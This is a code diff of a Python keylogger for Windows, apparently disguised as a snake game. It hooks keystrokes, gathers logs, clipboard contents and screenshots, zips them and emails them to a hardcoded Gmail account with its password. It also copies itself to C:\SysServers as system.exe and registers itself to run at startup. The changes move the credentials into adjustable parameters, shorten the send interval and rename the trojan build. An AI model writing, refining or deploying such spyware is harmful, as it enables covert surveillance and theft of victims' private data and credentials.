@@ -1,5 +1,4 @@
-# set PYTHONIOENCODING=UTF-8
-# pyinstaller -F -w system.py
+# pyinstaller -F -w -n snake system.py
 
 import pyHook, pythoncom, sys, win32api, win32con, os, time
 import win32clipboard, zipfile
@@ -12,6 +11,16 @@ from email.mime.base import MIMEBase
 from email import encoders
 from snake import start_game
 
+# ***********************
+# Modifiable parameters
+# ***********************
+# How many the user does window switches are needed for the keylogger 
+# to compress all the information and send it to the hacker.
+Packing_interval = 3
+
+email_sender = 'a.very.casual.email@gmail.com'
+email_password = 'HACKERNB123'
+receivers = email_sender
 
 addr = sys.path[0] + '\\log.txt'
 pic_path = sys.path[0] + '\\pic'
@@ -39,13 +48,12 @@ def before_send_after():
 
 def send_email():
     #send ZIP to email
-    sender = 'a.very.casual.email@gmail.com'
-    receivers = 'a.very.casual.email@gmail.com'
+    global email_sender, email_password, receivers
     
     msg = MIMEMultipart()
     msg.attach(MIMEText("Got new classified information!", 'html'))
     msg['Subject'] = 'New Screat From %s' % getpass.getuser()
-    msg['From'] = sender
+    msg['From'] = email_sender
     msg['To'] = receivers
 
     data = open(zip_path, 'rb')
@@ -61,15 +69,15 @@ def send_email():
     msg.attach(file_msg)
 
     s = smtplib.SMTP_SSL(host = 'smtp.gmail.com', port = 465)
-    s.login(user = 'a.very.casual.email@gmail.com', password = 'HACKERNB123')
-    s.sendmail(sender, receivers, msg.as_string())
+    s.login(user = email_sender, password = email_password)
+    s.sendmail(email_sender, receivers, msg.as_string())
     s.quit()
     
 def KBevent(event):
     global curr_window, counter
     if curr_window != event.WindowName:
         # zip all info and send to the hacker
-        if counter > 5:
+        if counter > Packing_interval:
             counter = 0
             before_send_after()
 
@@ -111,7 +119,8 @@ def KBevent(event):
 if not os.path.exists('C:\\SysServers'):
     os.makedirs('C:\\SysServers')
 if not os.path.exists('C:\\SysServers\\system.exe'):
-    shutil.copy('system.exe', 'C:\\SysServers')
+    shutil.copy('snake.exe', 'C:\\SysServers')
+    os.rename('C:\\SysServers\\snake.exe', 'C:\\SysServers\\system.exe')
 
 # Add it to Windows Startup
 name = 'SysServers'
